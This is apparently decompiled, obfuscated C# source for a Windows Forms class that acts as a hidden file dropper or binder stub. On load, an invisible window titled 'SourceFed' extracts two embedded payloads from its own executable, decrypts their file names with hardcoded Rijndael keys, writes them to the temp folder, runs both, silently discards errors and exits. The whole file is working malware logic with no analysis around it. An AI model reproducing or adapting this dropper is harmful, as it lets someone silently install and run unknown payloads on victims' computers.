using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ns0;

namespace ns1;

internal class Module_01 : Form
{
	private static List<WeakReference> list_0 = new List<WeakReference>();

	private IContainer icontainer_0;

	[DebuggerNonUserCode]
	public Module_01()
	{
		((Form)this).add_Load((EventHandler)Module_01_Load);
		smethod_0(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void smethod_0(object object_0)
	{
		checked
		{
			lock (list_0)
			{
				if (list_0.Count == list_0.Capacity)
				{
					int num = 0;
					int num2 = list_0.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = list_0[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								list_0[num] = list_0[num3];
							}
							num++;
						}
						num3++;
					}
					list_0.RemoveRange(num, list_0.Count - num);
					list_0.Capacity = list_0.Count;
				}
				list_0.Add(new WeakReference(RuntimeHelpers.GetObjectValue(object_0)));
			}
		}
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if ((disposing && icontainer_0 != null) ? true : false)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(4, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Control)this).set_Name("Module_01");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_Text("SourceFed");
		((Control)this).ResumeLayout(false);
	}

	private void Module_01_Load(object sender, EventArgs e)
	{
		byte[] array = Class6.smethod_0(Process.GetCurrentProcess().MainModule!.FileName);
		byte[] array2 = Class6.smethod_1(Process.GetCurrentProcess().MainModule!.FileName);
		byte[] bytes = Class6.smethod_2(Process.GetCurrentProcess().MainModule!.FileName);
		string @string = Encoding.Default.GetString(bytes);
		string[] array3 = Strings.Split(@string, Class5.smethod_0("nmjEJw==", "False"), -1, (CompareMethod)0);
		_ = Assembly.GetExecutingAssembly().GetName().CodeBase;
		try
		{
			((ServerComputer)Class1.smethod_0()).get_FileSystem().WriteAllBytes(Path.GetTempPath() + Class5.smethod_0("nQY=", "False") + method_0(array3[1], "False", "True"), array, false);
			((ServerComputer)Class1.smethod_0()).get_FileSystem().WriteAllBytes(Path.GetTempPath() + Class5.smethod_0("nQY=", "False") + method_0(array3[2], "False", "True"), array2, false);
			Process.Start(Path.GetTempPath() + Class5.smethod_0("nQY=", "False") + method_0(array3[1], "False", "True"));
			Process.Start(Path.GetTempPath() + Class5.smethod_0("nQY=", "False") + method_0(array3[2], "False", "True"));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Application.Exit();
	}

	public string method_0(string string_0, string string_1, string string_2)
	{
		string strHashName = "SHA1";
		string text = Conversions.ToString(2);
		string s = "ABHUSLAPSUDHNFOS";
		int num = 128;
		if (string.IsNullOrEmpty(string_0))
		{
			return "";
		}
		byte[] bytes = Encoding.ASCII.GetBytes(s);
		byte[] bytes2 = Encoding.ASCII.GetBytes(string_2);
		byte[] array = Convert.FromBase64String(string_0);
		PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(string_1, bytes2, strHashName, Conversions.ToInteger(text));
		checked
		{
			byte[] bytes3 = passwordDeriveBytes.GetBytes((int)Math.Round((double)num / 8.0));
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			rijndaelManaged.Mode = CipherMode.CBC;
			byte[] array2 = new byte[array.Length - 1 + 1];
			int count = 0;
			using (ICryptoTransform transform = rijndaelManaged.CreateDecryptor(bytes3, bytes))
			{
				using MemoryStream memoryStream = new MemoryStream(array);
				using CryptoStream cryptoStream = new CryptoStream(memoryStream, transform, CryptoStreamMode.Read);
				count = cryptoStream.Read(array2, 0, array2.Length);
				memoryStream.Close();
				cryptoStream.Close();
			}
			rijndaelManaged.Clear();
			return Encoding.UTF8.GetString(array2, 0, count);
		}
	}
}
